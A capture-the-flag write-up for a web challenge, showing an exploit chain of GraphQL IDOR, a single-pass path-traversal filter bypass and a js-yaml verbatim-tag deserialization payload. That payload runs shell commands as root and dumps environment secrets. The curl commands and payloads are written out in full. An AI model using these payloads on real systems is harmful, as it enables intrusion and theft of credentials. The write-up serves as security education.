---
title: "ClearHouse"
category: "Web"
tags: ["web", "graphql", "idor", "path-traversal", "yaml-deserialization", "js-yaml", "rce"]
solve_date: "2026-10-29T21:16:39+07:00"
language: "en"
points: 108
---

# ClearHouse — GraphQL IDOR to ops key, then path traversal and YAML RCE

**Flag:** `CTF{3a44e1b49fddeb721f5aada24d90b082}`
**Service:** `http://144.217.91.111:3004`
**Flag format:** `CTF{...}`

## Challenge

> ClearHouse is a small merchant settlement platform: merchants register, request payouts, and can file a correction referencing an earlier payout if one was double-counted.

The handout is the gateway source (`server.js`). The platform exposes a merchant API plus an internal ops surface and a separate report-rendering service. The flag is in the report-core process environment.

## Analysis

### Surface

The gateway is an Express app with a GraphQL endpoint and a small ops router:

| Endpoint | Auth | Purpose |
|---|---|---|
| `POST /register` | none | create a merchant, returns a session token |
| `POST /login` | none | returns a session token |
| `POST /graphql` | `Authorization: Bearer <token>` | merchant GraphQL API |
| `GET /ops/templates/download` | `x-api-key` (ops) | download a receipt template |
| `POST /ops/render-report` | `x-api-key` + `x-report-core-token` | relay a report to report-core |

Merchants create payouts and can file a correction referencing an earlier payout through `correctsPayoutId`. The report-core token is stored in `config/internal-secrets.json` and is required to make the gateway forward a report.

### Bug 1 — GraphQL IDOR leaks the ops API key

`createPayout` does not check that the caller owns the payout referenced by `correctsPayoutId`, and the `Payout.corrects` resolver returns the related merchant object — including its `apiKey`:

```graphql
mutation {
  createPayout(amount: 1, correctsPayoutId: "1") {
    corrects {
      merchant {
        id
        role
        apiKey
      }
    }
  }
}
```

Payout id `1` is seeded to `ops-internal`, so the response contains the ops key:

```text
ck_8a287204485346610208c0039af9bc771dd1382c
```

### Bug 2 — single-pass `../` filter in the template download

The ops handler sanitises the template name with one `replace`:

```js
const safe = name.replace('../', '');
const target = path.join(TEMPLATE_DIR, safe);
```

`String.prototype.replace` with a string pattern removes only the first occurrence. The payload:

```text
....//..//..//config/internal-secrets.json
```

after the first `../` removal becomes `../..//..//config/internal-secrets.json`. Resolved from `assets/templates/receipts`, that climbs three levels to the application root and reads `config/internal-secrets.json`:

```json
{"reportCoreToken":"f8d5e41b70726cb70a7c63ccf76038c5138daccfe1202500"}
```

### Bug 3 — YAML full-schema deserialization in report-core

`/ops/render-report` relays the request body to report-core, which parses it as YAML with js-yaml's full schema. The service blocks the shorthand `!!js/function` tag, but js-yaml also accepts the verbatim tag spelling for the same type:

```yaml
x: !<tag:yaml.org,2002:js/function> |
  function () {
    return process.env.FLAG;
  }
```

The verbatim tag resolves to the same `js/function` type, and report-core invokes the function while rendering the document. The function runs as `root` inside the report-core container; `process.env` contains `FLAG`.

## Exploit

### 1. Register, log in, leak the ops key

```bash
# register (returns a token)
curl -s -X POST http://144.217.91.111:3004/register \
  -H 'Content-Type: application/json' \
  -d '{"name":"mchtest_48213","password":"p4ssw0rd"}'
```

```json
{"token":"b0e4a8be1fdf8f6a79a2b7ae601d135abfb28293695f73e4..."}
```

```bash
TOKEN=b0e4a8be1fdf8f6a79a2b7ae601d135abfb28293695f73e4...
curl -s -X POST http://144.217.91.111:3004/graphql \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { createPayout(amount: 1, correctsPayoutId: \"1\") { corrects { merchant { id role apiKey } } } }"}'
```

```json
{"data":{"createPayout":{"corrects":{"merchant":{
  "id":"ops-internal","role":"ops",
  "apiKey":"ck_8a287204485346610208c0039af9bc771dd1382c"}}}}}
```

### 2. Read the report-core token

```bash
OPS=ck_8a287204485346610208c0039af9bc771dd1382c
curl -s -G http://144.217.91.111:3004/ops/templates/download \
  --data-urlencode 'name=....//..//..//config/internal-secrets.json' \
  -H "x-api-key: $OPS"
```

```json
{"reportCoreToken":"f8d5e41b70726cb70a7c63ccf76038c5138daccfe1202500"}
```

### 3. YAML function execution

```bash
TOK=f8d5e41b70726cb70a7c63ccf76038c5138daccfe1202500
cat > /tmp/yaml_fn.txt <<'EOF'
x: !<tag:yaml.org,2002:js/function> |
  function () {
    var out = 'ENV=' + JSON.stringify(process.env) + '\n';
    try {
      var req = (process.mainModule && process.mainModule.require)
        ? process.mainModule.require.bind(process.mainModule)
        : (typeof require !== 'undefined' ? require : null);
      if (req) {
        out += 'CMD=' + req('child_process').execSync(
          'id; hostname; cat /flag /flag.txt /app/flag.txt /app/flag 2>/dev/null'
        ).toString();
      } else { out += 'NO_REQUIRE'; }
    } catch (e) { out += 'ERR=' + e.message; }
    return out;
  }
EOF

curl -s -X POST http://144.217.91.111:3004/ops/render-report \
  -H "x-api-key: $OPS" \
  -H "x-report-core-token: $TOK" \
  -H 'Content-Type: text/plain' \
  --data-binary @/tmp/yaml_fn.txt
```

The response contains the report-core environment and command output:

```text
ENV={"NODE_VERSION":"20.20.2","HOSTNAME":"b2632a3c2d3f",...,"FLAG":"CTF{3a44e1b49fddeb721f5aada24d90b082}",...}
CMD=uid=0(root) gid=0(root) groups=0(root),...
```

The flag is `FLAG` in `process.env`:

```text
CTF{3a44e1b49fddeb721f5aada24d90b082}
```

## Notes

- The three bugs chain cleanly: GraphQL IDOR gives the ops key, the single-pass traversal gives the report-core token, and the YAML full-schema verbatim tag gives code execution.
- The `apiKey` leak is a resolver-level authorization failure: `Payout.corrects` exposes the related merchant object without filtering fields by role.
- The traversal filter is classic `replace` misuse — it removes the first `../` but leaves the second one intact.
- The YAML blocklist matches the shorthand `!!js/function`; the verbatim `!<tag:yaml.org,2002:js/function>` form resolves to the same type and bypasses the check.
- `/ops/render-report` rate-limits attempts; a 429 burst backed off and retried until a 200 returned.

## References

- js-yaml full schema (`js/function` type)
- OWASP: GraphQL IDOR / broken object-level authorization
- OWASP: path traversal and unsafe deserialization
